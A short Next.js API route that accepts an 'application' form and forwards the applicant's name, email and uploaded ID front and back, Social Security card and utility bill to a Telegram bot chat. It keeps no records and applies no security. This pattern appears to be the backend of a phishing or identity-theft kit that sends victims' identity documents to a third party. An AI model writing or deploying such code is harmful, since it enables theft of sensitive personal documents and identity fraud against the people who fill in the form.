export const config = {
  api: {
    bodyParser: false,
  },
};

import formidable from "formidable";
import fs from "fs";
import fetch from "node-fetch";
import FormData from "form-data";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const form = formidable({ multiples: true }); // ✅ FIXED HERE

  form.parse(req, async (err, fields, files) => {
    if (err) {
      console.error("Form parse error:", err);
      return res.status(500).json({ error: "Form parse error" });
    }

    // const BOT_TOKEN = process.env.BOT_TOKEN;
    // const CHAT_ID = process.env.CHAT_ID;
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).json({ error: "Missing environment variables" });
    }

    try {
      // ✅ Send text message
      const message = `
📩 NEW APPLICATION

👤 Name: ${fields.firstName}
📧 Email: ${fields.email}
      `;

      await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
          }),
        }
      );

      // ✅ Send files
      const fileFields = ["idFront", "idBack", "ssnCard", "utilityBill"];

      for (let field of fileFields) {
        if (files[field]) {
          const file = Array.isArray(files[field])
            ? files[field][0]
            : files[field];

          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("document", fs.createReadStream(file.filepath));

          await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
            {
              method: "POST",
              body: formData,
              headers: formData.getHeaders(),
            }
          );
        }
      }

      return res.status(200).json({ success: true });

    } catch (error) {
      console.error("Telegram error:", error);
      return res.status(500).json({ error: "Telegram send failed" });
    }
  });
}